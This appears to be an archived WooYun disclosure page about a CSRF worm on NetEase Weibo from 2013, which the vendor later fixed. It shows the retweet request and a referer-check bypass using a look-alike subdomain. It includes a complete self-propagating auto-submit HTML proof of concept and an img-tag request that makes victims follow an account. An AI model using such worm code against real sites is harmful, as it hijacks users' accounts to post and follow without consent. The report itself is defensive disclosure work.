@@ -1,0 +1,244 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		我是如何绕过网易防御、利用CSRF蠕虫继续刷粉丝的  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		我是如何绕过网易防御、利用CSRF蠕虫继续刷粉丝的  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/风萧萧">风萧萧</a> 
+</li><li>提交时间：		2013-01-16 15:01</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-01-16：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-01-17：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-01-27：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-02-06：	细节向普通白帽子公开<br/>
+									2013-02-16：	细节向实习白帽子公开<br/>
+									2013-03-02：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">感谢@王小贱 @xsjswt提供的友情支持！高安全的就得交一些这样的朋友撒！</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">1.既然是CSRF蠕虫，肯定是发微博的地方出了问题！接口在这里：<br />
+<br />
+</p><pre><code>POST http://t.163.com/share/retweet HTTP/1.1<br />
+Host: t.163.com<br />
+Proxy-Connection: keep-alive<br />
+Content-Length: 439<br />
+Origin: http://t.163.com<br />
+User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.97 Safari/537.11<br />
+Content-Type: application/x-www-form-urlencoded<br />
+Accept: */*<br />
+Accept-Encoding: gzip,deflate,sdch<br />
+Accept-Language: zh-CN,zh;q=0.8<br />
+Accept-Charset: GBK,utf-8;q=0.7,*;q=0.3<br />
+Cookie: 略<br />
+<br />
+status=%E6%AC%A7%E8%81%94%E5%B0%8F%E7%BB%84%E6%9C%AB%E8%BD%AE%E6%AC%A1%E6%97%A5%E7%BB%BC%E8%BF%B0%3A32%E5%BC%BA%E4%BA%A7%E7%94%9F+%E7%83%AD%E5%88%BA%E5%A4%A7%E8%83%9C%E5%87%BA%E5%B1%80http%3A%2F%2Fsports.163.com%2F11%2F1216%2F06%2F7LCJG29T00051F6Q.html&amp;in_reply_to_status_id=&amp;source=%E7%BD%91%E6%98%93%E4%BD%93%E8%82%B2&amp;link=http%3A%2F%2Fsports.163.com%2F11%2F1216%2F06%2F7LCJG29T00051F6Q.html&amp;imageUrl=&amp;method=click&amp;keyfrom=share163.share</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+2.上述链接即为发微博的另一个接口（实际上应该是转发微博），简单说下参数，status参数即为发布的微博内容，这里是必填项，我可以把csrf蠕虫的载体做为链接发在这里，欺骗用户点击！参数in_reply_to_status_id默认不填，source选填项，表示微博从哪里转发过来的，link不知，不填也木关系，method和keyfrom默认即可！<br />
+<br />
+<br />
+<br />
+3.这里实际上是做referer判断的，即referer必须为163.com或者空，其他域不行。这意味着我是不是只能本地单机玩了啊！哈哈，经过长时间的测试，发现验证referer的正则表达式写的有问题！只是判断了域名是否包含有163.com，而不是验证根域名为163.com。那么我这里可以构造子域名t.163.com.test.av作为蠕虫传播的载体服务器，即可绕过。 </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">4.非常感谢@xsjswt提供的子域名，我的POC在下面这个链接：</p><pre><code>http://t.163.com.xsjswt.3322.org/admin/sessiondata/csrf.html</code></pre><p class='detail'><br />
+<br />
+一并将代码拷贝如下：</p><pre><code>&lt;html&gt;<br />
+&lt;head&gt;<br />
+&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;&gt;<br />
+&lt;/head&gt;<br />
+&lt;body&gt;<br />
+&lt;form id=&quot;fxx&quot; name=&quot;fxx&quot; action=&quot;http://t.163.com/share/retweet&quot; method=&quot;POST&quot;&gt;<br />
+&lt;input type=&quot;text&quot; name=&quot;status&quot; value=&quot;缘深缘浅，路长路短，看见就好...http://t.163.com.xsjswt.3322.org/admin/sessiondata/csrf.html&quot; /&gt;<br />
+&lt;input type=&quot;text&quot; name=&quot;in_reply_to_status_id&quot; value=&quot;&quot; /&gt;<br />
+&lt;input type=&quot;text&quot; name=&quot;source&quot; value=&quot;风萧萧兮易水寒&quot; /&gt;<br />
+&lt;input type=&quot;text&quot; name=&quot;link&quot; value=&quot;http://t.163.com.xsjswt.3322.org/admin/sessiondata/csrf.html&quot; /&gt;<br />
+&lt;input type=&quot;text&quot; name=&quot;imageUrl&quot; value=&quot;&quot; /&gt;<br />
+&lt;input type=&quot;text&quot; name=&quot;method&quot; value=&quot;click&quot; /&gt;<br />
+&lt;input type=&quot;text&quot; name=&quot;keyfrom&quot; value=&quot;share163.share&quot; /&gt;<br />
+&lt;input type=&quot;submit&quot; value=&quot;submit&quot; /&gt;<br />
+&lt;/form&gt;<br />
+&lt;script&gt;<br />
+	document.fxx.submit();<br />
+&lt;/script&gt;<br />
+&lt;/body&gt;<br />
+&lt;/html&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+5.Chrome登录风萧萧吸的微博账号发布微博如下：</p><p class="detail"><a href="../images/16144903be386457c77d33f8d0ca38afe980c0a1.jpg" target="_blank"><img src="../images/16144903be386457c77d33f8d0ca38afe980c0a1.jpg" alt="1.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+6.Firefox登录另一个网易微博账号：</p><p class="detail"><a href="../images/16144937c34260f698f3b0a14e72d4da962d617d.jpg" target="_blank"><img src="../images/16144937c34260f698f3b0a14e72d4da962d617d.jpg" alt="2.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+7.受害者点击上述短链接，服务器访问如下：</p><p class="detail"><a href="../images/1614505945a7bfab8b4081c58c6aa874ee04041a.jpg" target="_blank"><img src="../images/1614505945a7bfab8b4081c58c6aa874ee04041a.jpg" alt="3.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+8.再查看主页面，发布了一条同样的微博哦：</p><p class="detail"><a href="../images/1614512349d45b6349af620c7a8bdda57e49d85d.jpg" target="_blank"><img src="../images/1614512349d45b6349af620c7a8bdda57e49d85d.jpg" alt="4.jpg" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">1.其实中间遇到了不少问题，referer为空可以绕过防御，所以方便了本地测试。但是原数据包纹风不动的提交可以正常发布微博的，但是放在POC里，本地提交总是返回【var updatestatus = 400】。后来才知道是编码的问题，服务器端只认UTF-8。<br />
+<br />
+<br />
+<br />
+2.既然referer域名可以改成t.163.com.test.av是可以的，那么改成test.av/csrf.php?163.com呢，是不是可以呢？这个以后大家当做小的细节来考虑吧！<br />
+<br />
+<br />
+<br />
+3.既然上面的蠕虫已经实现，刷粉丝就可以更容易了，在POC里加如下代码可点击即关注：</p><pre><code>&lt;img src=http://t.163.com/share/follow?followfrom=op.wz.gfo&amp;keyfrom=op.wz.gfo&amp;sitechannel=no&amp;method=follow&amp;screenName=【微博ID】/&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+4.在防御方面，强烈建议：<br />
+<br />
+关键请求还是改成post比较好！<br />
+<br />
+关键请求还是加token比较好！<br />
+<br />
+<br />
+<br />
+5.另外，不管怎样我还是来求个礼物吧！ </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/风萧萧" title="风萧萧">风萧萧</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-017374" title="我是如何绕过网易防御、利用CSRF蠕虫继续刷粉丝的">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：15 </p>
+													<p class="detail">确认时间：2013-01-17 18:40</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">感谢您对网易的关注，漏洞已经修复。</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="17374";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
